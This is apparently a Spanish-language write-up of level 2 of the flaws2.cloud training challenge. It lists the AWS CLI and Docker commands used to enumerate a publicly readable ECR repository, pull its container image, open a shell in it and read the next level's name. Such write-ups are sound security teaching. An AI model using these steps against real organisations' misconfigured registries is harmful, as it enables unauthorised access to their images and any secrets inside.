---
title: "Level 2"
---

# Level 2

http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/

Nos dan el enlace de un ECR (registro de contenedores):

http://container.target.flaws2.cloud/

Nos dicen que el ECR se llama **level2**, como el repo es público lo podemos listar desde cualquier cuenta

```bash
aws ecr list-images --repository-name level2 --registry-id 653711331788 --region us-east-1
```

Para sacar el registry-id del repo objetivo

```bash
aws sts get-caller-identity --profile profile --region us-east-1
```

**registry-id**  -> La cuenta propietaria del registro (su AccountID)
**repository-name** -> Nombre de repositorio (estantería de imágenes)
**container** -> Lo que se crea en base a una imagen.

Listar imágenes de un repositorio:
```bash
aws ecr describe-images --repository-name level2 --registry-id 653711331788  --region us-east-1
```

Obtener el digest de la imagen (id):
```bash
aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest  --region us-east-1 | jq '.images[].imageManifest | fromjson'
```

Obtener la url de descarga de la imagen pasándole el digest:
```bash
aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621" --region us-east-1
```

Se trata de una imagen de contenedor, para poder deployearlo usamos docker

En mi terminal local:

```bash
aws configure --profile level2
```

Generar una contraseña de un solo uso y pasársela a docker , el nombre de usuario de un ECR es siempre AWS:
```bash
aws ecr get-login-password --region us-east-1 --profile level1 | \
docker login --username AWS --password-stdin 653711331788.dkr.ecr.us-east-1.amazonaws.com
```

La url del registry es : `653711331788.dkr.ecr.us-east-1.amazonaws.com`

Hacemos pull de la imagen del repositorio level2
```bash
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```

Ejecutamos una shell
```bash
docker run -it --rm 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest sh
```

El nombre del siguiente nivel está en :
```bash
cat /var/www/index.htm
```
